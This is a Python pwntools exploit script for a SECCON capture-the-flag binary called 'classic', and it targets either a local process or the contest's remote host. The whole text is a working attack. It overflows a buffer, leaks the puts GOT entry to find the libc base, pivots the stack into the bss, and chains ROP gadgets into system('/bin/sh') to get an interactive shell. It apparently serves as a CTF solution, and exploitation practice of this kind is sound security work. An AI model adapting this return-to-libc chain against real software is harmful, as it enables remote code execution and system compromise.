#!/usr/bin/env python
from pwn import *

if len(sys.argv) == 1:
    s = process('./classic', env = {'LD_PRELOAD': './libc-2.23.so'})
else:
    s = remote('classic.pwn.seccon.jp', 17354)

elf = ELF('./classic')
libc = ELF('./libc-2.23.so')

pop_rdi = 0x400753
pop_rsi = 0x400751
leave = 0x4006e5

payload = ''
payload += 'A' * 0x40
payload += p64(elf.bss(0x500 - 0x8))
payload += p64(pop_rdi) + p64(elf.got['puts'])
payload += p64(elf.symbols['puts'])
payload += p64(pop_rdi) + p64(elf.bss(0x500))
payload += p64(elf.symbols['gets'])
payload += p64(leave)
s.sendline(payload)

s.recvuntil('Have a nice pwn!!\n')
libc_base = u64(s.recvline(False).ljust(8, '\0')) - libc.symbols['puts']
log.info('libc base: %#x' % libc_base)

payload = ''
payload += p64(pop_rdi) + p64(libc_base + libc.search('/bin/sh').next())
payload += p64(libc_base + libc.symbols['system'])
s.sendline(payload)
s.interactive()
